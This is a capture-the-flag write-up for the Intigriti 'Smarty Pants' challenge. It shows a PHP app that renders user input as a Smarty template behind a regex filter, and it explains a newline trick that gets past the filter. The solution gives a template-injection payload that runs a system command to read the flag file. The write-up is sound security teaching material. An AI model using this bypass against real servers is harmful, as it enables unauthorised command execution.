# Smarty Pants [99 Solves]

## Description

> Since you're so smart then you should have no problem with this one 🤓
>
> Author: Protag
>
> <https://smartypants.ctf.intigriti.io> || <https://smartypants2.ctf.intigriti.io>
>
> Attachments: smarty.tar.gz

<details><summary>Attachment file tree</summary>

```console
$ tar zxvf smarty.tar.gz
docker-compose.yml
Dockerfile
flag.txt
index.php
index.tpl
start.sh
README.md
```

</details>

<details><summary>index.php</summary>

```php
<?php
if(isset($_GET['source'])){
    highlight_file(__FILE__);
    die();
}

require('/var/www/vendor/smarty/smarty/libs/Smarty.class.php');
$smarty = new Smarty();
$smarty->setTemplateDir('/tmp/smarty/templates');
$smarty->setCompileDir('/tmp/smarty/templates_c');
$smarty->setCacheDir('/tmp/smarty/cache');
$smarty->setConfigDir('/tmp/smarty/configs');

$pattern = '/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/';

if(!isset($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->display('index.tpl');
    exit();
}

// returns true if data is malicious
function check_data($data){
    global $pattern;
    return preg_match($pattern,$data);
}

if(check_data($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->assign('error', 'Malicious Inputs Detected');
    $smarty->display('index.tpl');
    exit();
}

$tmpfname = tempnam("/tmp/smarty/templates", "FOO");
$handle = fopen($tmpfname, "w");
fwrite($handle, $_POST['data']);
fclose($handle);
$just_file = end(explode('/',$tmpfname));
$smarty->display($just_file);
unlink($tmpfname);
```

</details>

## Flag

INTIGRITI{php_4nd_1ts_many_f00tgun5}

## Solution

This challenge uses [Smarty](https://github.com/smarty-php/smarty), a PHP Template Engine.
The Web application has the functionality of the user input and shows it by calling `$smarty->display($just_file);`.
The user-controllable value is restricted with `'/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/';` regulation expression.
For example, `{system('id')}` cannot be input.

But fortunately, we can bypass this by using newline.
The following payload can be input.

```php
{system('cat /flag.txt')
}
```

Got the flag.

## References

- [PayloadsAllTheThings Smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#smarty)
